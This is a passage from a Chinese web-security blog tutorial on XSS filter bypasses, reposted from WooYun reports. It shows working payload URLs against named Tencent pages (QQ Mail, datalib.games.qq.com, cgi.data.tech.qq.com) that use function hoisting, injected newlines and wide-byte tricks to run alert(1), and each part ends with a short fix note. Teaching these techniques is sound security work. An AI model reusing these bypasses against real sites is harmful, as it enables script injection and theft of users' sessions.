<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aaa();</span><br><span class="line"></span><br><span class="line">function aaa()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>凡是以 <code>function xxx()&#123;&#125;</code> 形式定义的函数，都会被最优先解析。换句话说：</p>
<p>解析器在解析 JS 代码段时，会先将 <code>function xxx()&#123;&#125;</code> 拿到最前面解析，然后再依次解析其它的部分。 换句话说，上面的代码，实际的解析顺序是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function aaa()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">aaa();</span><br></pre></td></tr></table></figure>
<p>利用这样一个特性，我们的代码可以改改。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&quot;.........&quot;+&quot;&amp;ss&#x3D;aaaa\&quot;+&quot;&amp;from&#x3D;&#x3D;1;function from()&#123;&#125;&#x2F;&#x2F;&quot;+&quot;&amp;param&#x3D;&quot;;</span><br></pre></td></tr></table></figure>
<p>这样一来，我们的 <code>function from()&#123;&#125;</code> 就会被提前解析，从而定义了 from, 后面 <code>from==1</code> 的时候，就不会报错啦～～</p>
<ol start="6">
<li>故事往往是曲折的，到了这一步，我们会发现还是不行。</li>
</ol>
<p>看一看源代码吧～～ ，哎，我们的空格被转义为了 <code> </code></p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_020.jpg" alt="image"></p>
<ol start="7">
<li>当然，这么一点小事情，难不到我们的，我们用注释符来做分隔符。 <code>/**/</code>替换空格，有没有觉得和 sql 注入一样了，咔咔。</li>
</ol>
<p>于是，我们的代码变为了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&quot;.........&quot;+&quot;&amp;ss&#x3D;aaaa\&quot;+&quot;&amp;from&#x3D;&#x3D;1;function&#x2F;**&#x2F;from()&#123;&#125;&#x2F;&#x2F;&quot;+&quot;&amp;param&#x3D;&quot;;</span><br></pre></td></tr></table></figure>
<ol start="8">
<li>嗯，这次没有语法错误了，我们插入我们自己的 JS 代码。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href&#x3D;&quot;.........&quot;+&quot;&amp;ss&#x3D;aaaa\&quot;+&quot;&amp;from&#x3D;&#x3D;1;alert(1);function&#x2F;**&#x2F;from()&#123;&#125;&#x2F;&#x2F;&quot;+&quot;&amp;param&#x3D;&quot;;</span><br></pre></td></tr></table></figure>
<p>最终的利用代码如下：</p>
<p>恩，这次是我们的 反斜线为 双引号报仇啦！</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_021.jpg" alt="image"></p>
<p>只有在不登录 QQ 邮箱的情况下触发，比较鸡肋，实际意义不大，仅供研究。</p>
<h2 id="修复方案-4"><a href="#修复方案-4" class="headerlink" title="修复方案"></a>修复方案</h2><ol>
<li><p>随便修修就好。</p>
</li>
<li><p>某些情况下，<code>\</code> 还是很危险的。</p>
</li>
</ol>
<h1 id="6-换行符复仇记"><a href="#6-换行符复仇记" class="headerlink" title="6. 换行符复仇记"></a>6. 换行符复仇记</h1><blockquote>
<p>来源：<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-016003">6. 换行符复仇记</a></p>
</blockquote>
<h2 id="简要描述-5"><a href="#简要描述-5" class="headerlink" title="简要描述"></a>简要描述</h2><p>还是在``之间的场景，某些情况下，我们仅仅需要的只是一个换行符，就可以绕过过滤了。 它让双引号，尖括号知道了“它 们不是一个符号在战斗”。</p>
<p>1.实际场景是下面这个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;datalib.games.qq.com&#x2F;cgi-bin&#x2F;search?libid&#x3D;178&amp;FilterAttrAND&#x3D;3602&amp;FilterValueAND&#x3D;aaaaaaaaaa</span><br></pre></td></tr></table></figure>
<p>对应的，我们可以看到我们的输入 aaaaaaaaa 会在页面的哪些输出点出现呢？</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_022.jpg" alt="image"></p>
<ol start="2">
<li>不错，一共有 5 处，有在 HTML 标签之间的（教程 1），也有在<code>&lt;script&gt;..&lt;/script&gt;</code>之间的。但是呢，该过滤的，<code>&lt;</code> , <code>&gt;</code> 过滤掉了，该过滤的 <code>&quot;</code> ，也过滤掉了。。</li>
</ol>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_023.jpg" alt="image"></p>
<ol start="3">
<li>也就是说传统的已经不行啦，我们继续看 5 处的其他地方。呀，竟然还有一大段注释里，也出现了我们的【输出】</li>
</ol>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_024.jpg" alt="image"></p>
<ol start="4">
<li>嗯，这样一来，是否会想到这样一个用法呢？</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;我是注释，我爱洗澡，哦～哦～哦～ [我是输出]</span><br></pre></td></tr></table></figure>
<p>如果可以使用换行符的话。</p>
<p>这样 <code>alert(1);</code> 就会被成功执行。</p>
<ol start="5">
<li>恩，带着这样一个想法，我们不难构造出以下利用。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;datalib.games.qq.com&#x2F;cgi-bin&#x2F;search?libid&#x3D;178&amp;FilterAttrAND&#x3D;3602&amp;FilterValueAND&#x3D;%0aalert(1);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>看下输出。嘿，果然没过滤。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_025.jpg" alt="image"></p>
<ol start="6">
<li>这样，这一次我们的换行符立功了， 它不是一个符号在战斗！</li>
</ol>
<h2 id="修复方案-5"><a href="#修复方案-5" class="headerlink" title="修复方案"></a>修复方案</h2><p>尽量不要在 JS 的注释里输出内容。还挺危险的。</p>
<h2 id="个人备注-2"><a href="#个人备注-2" class="headerlink" title="个人备注"></a>个人备注</h2><p>1、记住几个常用的html编码：如&lt;对应<code>&amp;lt;</code>  &gt;对应<code>&amp;gt;</code>  “对应<code>&amp;quot;</code></p>
<p>2、换行符%0a</p>
<h1 id="7-宽字节、反斜线与换行符一起复仇记"><a href="#7-宽字节、反斜线与换行符一起复仇记" class="headerlink" title="7. 宽字节、反斜线与换行符一起复仇记"></a>7. 宽字节、反斜线与换行符一起复仇记</h1><blockquote>
<p>来源：<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-016008">7. 宽字节、反斜线与换行符一起复仇记</a></p>
</blockquote>
<h2 id="简要描述-6"><a href="#简要描述-6" class="headerlink" title="简要描述"></a>简要描述</h2><p>这一次，3 个家伙一起上啦～</p>
<h2 id="详细说明-5"><a href="#详细说明-5" class="headerlink" title="详细说明"></a>详细说明</h2><ol>
<li>实例点如下：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cgi.data.tech.qq.com&#x2F;index.php?mod&#x3D;search&amp;type&#x3D;data&amp;site&#x3D;digi&amp;libid&#x3D;2&amp;curpage&#x3D;1&amp;pagenum&#x3D;30&amp;filterattr&#x3D;138, 138|16|4,5,4,5&amp;filtervalue&#x3D;3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname&#x3D;centersearch.shtml&amp;orderby&#x3D;aaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
<p>老规矩，继续看我们的输出。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_026.jpg" alt="image"></p>
<ol start="2">
<li><p>一共有 3 处输出，位于 HTML 属性里的那一处，我们放弃了，因为双引号被灭掉了。那么还剩下 2 处。 都是位于<code>&lt;script&gt;...&lt;/script&gt;</code>里，而且挨在了一起。</p>
</li>
<li><p>先看第 2 处，是不是似曾相似啊？ 对的，教程 6 里刚刚遇到过。那就是输出在【注释】的情况。我们用换行符试试？</p>
</li>
</ol>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_027.jpg" alt="image"></p>
<ol start="4">
<li><p>一条是好消息，换行可以用，一条是坏消息。。下面出现的一句坏了我们的好事。。肿么办。</p>
</li>
<li><p>这个时候，我们需要先说点 javascript 的知识。 javascript，字符串允许下面多行的写法。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a&#x3D;&quot;我是一个字符串\ 我还是一个字符串&quot;;</span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>基于这点，我们可以把缺陷点构造成下面的样子。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;document.getElementById(&quot;order_select&quot;).value &#x3D; &quot;aaaa\ alert(1);&#x2F;&#x2F;&quot;;</span><br><span class="line">var searchOrder &#x3D; &quot;aaaa\ alert(1);&#x2F;&#x2F;&quot;;</span><br></pre></td></tr></table></figure>
<p>那么代码构造的解析如下：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_028.jpg" alt="image"></p>
<p>7.带着这个想法，请上我们的反斜线。。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_029.jpg" alt="image"></p>
<ol start="8">
<li><p>悲剧的是，反斜线被过滤成了 2 个<code>\\</code>，这下不好办了。</p>
</li>
<li><p>还记得在教程 4 里，我们提到的宽字节用法么？说到了 <code>%c0</code> 可以吃掉<code>%5c</code>。 我们看看页面的编码。</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;gb2312&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
<p>gbxxx 系列的啊，窃喜中。</p>
<ol start="10">
<li>于是，我们的<code>%c0</code> 也加入战斗了。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cgi.data.tech.qq.com&#x2F;index.php?mod&#x3D;search&amp;type&#x3D;data&amp;site&#x3D;digi&amp;libid&#x3D;2&amp;curpage&#x3D;1&amp;pagenum&#x3D;30&amp;filterattr&#x3D;138,138|16|4,5,4,5&amp;filtervalue&#x3D;3500-4000,%B4%F3%D3%DA4000|%D0%FD%D7%AA|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname&#x3D;centersearch.shtml&amp;orderby&#x3D;aaaa%c0%5c%0aalert(1);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>看看源码中的输出。 <code>\\</code> 被我们变成了 <code>乱码+\</code></p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_030.jpg" alt="image"></p>
<ol start="11">
<li>此时，标点符号们正在开会，开会的主题是：“大家好，才是真的好”</li>
</ol>
<h2 id="修复方案-6"><a href="#修复方案-6" class="headerlink" title="修复方案"></a>修复方案</h2><p>参加前面教程4，5，6</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>那些年我们一起学XSS</p><p><a href="http://b0u4ne.gihub.io/2019/10/16/web渗透/那些年我们一起学XSS/">http://b0u4ne.gihub.io/2019/10/16/web渗透/那些年我们一起学XSS/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>B0urne</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2019-10-16</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2020-07-27</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="sharethis-inline-share-buttons"></div><script src="www.baidu.com" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" href="/" target="_blank" rel="noopener" data-type="afdian"><span class="icon is-small"><i class="fas fa-charging-station"></i></span><span>爱发电</span></a><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.png" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.png" alt="微信"></span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="buymeacoffee"><span class="icon is-small"><i class="fas fa-coffee"></i></span><span>送我杯咖啡</span></a><a class="button donate" href="/" target="_blank" rel="noopener" data-type="patreon"><span class="icon is-small"><i class="fab fa-patreon"></i></span><span>Patreon</span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2019/10/16/web%E6%B8%97%E9%80%8F/php%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">php后门复现</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2019/10/16/web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95waf/"><span class="level-item">文件上传绕waf</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="B0urne"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">B0urne</p><p class="is-size-6 is-block">渗透测试/WEB安全</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">79</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#1-什么都没过滤的入门情况"><span class="level-left"><span class="level-item">1</span><span class="level-item">1. 什么都没过滤的入门情况</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简要描述"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">简要描述</span></span></a></li><li><a class="level is-mobile" href="#详细说明"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">详细说明</span></span></a></li><li><a class="level is-mobile" href="#修复方案"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">修复方案</span></span></a></li></ul></li><li><a class="level is-mobile" href="#2-输出在-之间的情况"><span class="level-left"><span class="level-item">2</span><span class="level-item">2. 输出在``之间的情况</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简要描述-1"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">简要描述</span></span></a></li><li><a class="level is-mobile" href="#详细说明-1"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">详细说明</span></span></a></li><li><a class="level is-mobile" href="#修复方案-1"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">修复方案</span></span></a></li></ul></li><li><a class="level is-mobile" href="#3-输出在-HTML-属性里的情况"><span class="level-left"><span class="level-item">3</span><span class="level-item">3. 输出在 HTML 属性里的情况</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简要描述-2"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">简要描述</span></span></a></li><li><a class="level is-mobile" href="#详细说明-2"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">详细说明</span></span></a></li><li><a class="level is-mobile" href="#修复方案-2"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">修复方案</span></span></a></li><li><a class="level is-mobile" href="#个人备注"><span class="level-left"><span class="level-item">3.4</span><span class="level-item">个人备注</span></span></a></li></ul></li><li><a class="level is-mobile" href="#4-宽字节复仇记-QQ-邮箱基本通用"><span class="level-left"><span class="level-item">4</span><span class="level-item">4. 宽字节复仇记 [QQ 邮箱基本通用]</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简要描述-3"><span class="level-left"><span class="level-item">4.1</span><span class="level-item">简要描述</span></span></a></li><li><a class="level is-mobile" href="#详细说明-3"><span class="level-left"><span class="level-item">4.2</span><span class="level-item">详细说明</span></span></a></li><li><a class="level is-mobile" href="#漏洞证明"><span class="level-left"><span class="level-item">4.3</span><span class="level-item">漏洞证明</span></span></a></li><li><a class="level is-mobile" href="#修复方案-3"><span class="level-left"><span class="level-item">4.4</span><span class="level-item">修复方案</span></span></a></li><li><a class="level is-mobile" href="#个人备注-1"><span class="level-left"><span class="level-item">4.5</span><span class="level-item">个人备注</span></span></a></li></ul></li><li><a class="level is-mobile" href="#5-反斜线复仇记"><span class="level-left"><span class="level-item">5</span><span class="level-item">5. 反斜线复仇记</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简要描述-4"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">简要描述</span></span></a></li><li><a class="level is-mobile" href="#详细说明-4"><span class="level-left"><span class="level-item">5.2</span><span class="level-item">详细说明</span></span></a></li><li><a class="level is-mobile" href="#修复方案-4"><span class="level-left"><span class="level-item">5.3</span><span class="level-item">修复方案</span></span></a></li></ul></li><li><a class="level is-mobile" href="#6-换行符复仇记"><span class="level-left"><span class="level-item">6</span><span class="level-item">6. 换行符复仇记</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简要描述-5"><span class="level-left"><span class="level-item">6.1</span><span class="level-item">简要描述</span></span></a></li><li><a class="level is-mobile" href="#修复方案-5"><span class="level-left"><span class="level-item">6.2</span><span class="level-item">修复方案</span></span></a></li><li><a class="level is-mobile" href="#个人备注-2"><span class="level-left"><span class="level-item">6.3</span><span class="level-item">个人备注</span></span></a></li></ul></li><li><a class="level is-mobile" href="#7-宽字节、反斜线与换行符一起复仇记"><span class="level-left"><span class="level-item">7</span><span class="level-item">7. 宽字节、反斜线与换行符一起复仇记</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#简要描述-6"><span class="level-left"><span class="level-item">7.1</span><span class="level-item">简要描述</span></span></a></li><li><a class="level is-mobile" href="#详细说明-5"><span class="level-left"><span class="level-item">7.2</span><span class="level-item">详细说明</span></span></a></li><li><a class="level is-mobile" href="#修复方案-6"><span class="level-left"><span class="level-item">7.3</span><span class="level-item">修复方案</span></span></a></li></ul></li></ul></div></div><style>#toc .menu-list > li > a.is-active + .menu-list { display: block; }#toc .menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://www.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">oldthree</span></span><span class="level-right"><span class="level-item tag">www.ol4three.com</span></span></a></li><li><a class="level is-mobile" href="http://blog.leanote.com/xcniao@foxmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">XCniao</span></span><span class="level-right"><span class="level-item tag">blog.leanote.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Mac/"><span class="level-start"><span class="level-item">Mac</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQL注入</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/SpringBoot/"><span class="level-start"><span class="level-item">SpringBoot</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/XSS/"><span class="level-start"><span class="level-item">XSS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/hexo/"><span class="level-start"><span class="level-item">hexo</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">web渗透</span></span><span class="level-end"><span class="level-item tag">20</span></span></a></li><li><a class="level is-mobile" href="/categories/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="level-start"><span class="level-item">人生感悟</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%9B%E9%98%B6/"><span class="level-start"><span class="level-item">博客搭建进阶</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%8F%90%E6%9D%83/"><span class="level-start"><span class="level-item">提权</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="level-start"><span class="level-item">文件上传</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="level-start"><span class="level-item">服务器原理</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">渗透测试</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/recurrent/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><span class="level-start"><span class="level-item">漏洞挖掘</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%95%E8%BF%87/"><span class="level-start"><span class="level-item">绕过</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"><span class="level-start"><span class="level-item">问题汇总</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%9D%A2%E8%AF%95/"><span class="level-start"><span class="level-item">面试</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-01T07:39:36.000Z">2021-02-01</time></p><p class="title"><a href="/2021/02/01/CVE-2021-3156-Sudo%E6%8F%90%E6%9D%83/">CVE-2021-3156 Sudo提权</a></p><p class="categories"><a href="/categories/%E6%8F%90%E6%9D%83/">提权</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T05:24:31.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/Selenium%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">Selenium使用教程</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T04:22:09.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/">FckEditor编辑器上传漏洞getshel总结</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-25T09:50:55.000Z">2021-01-25</time></p><p class="title"><a href="/2021/01/25/JumpServer-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2021/">JumpServer 远程命令执行-2021</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-23T09:21:22.000Z">2021-01-23</time></p><p class="title"><a href="/2021/01/23/%E5%85%B3%E9%97%AD%E5%B8%B8%E8%A7%81%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84HSTS%E5%8A%9F%E8%83%BD/">关闭常见浏览器的HSTS功能</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level 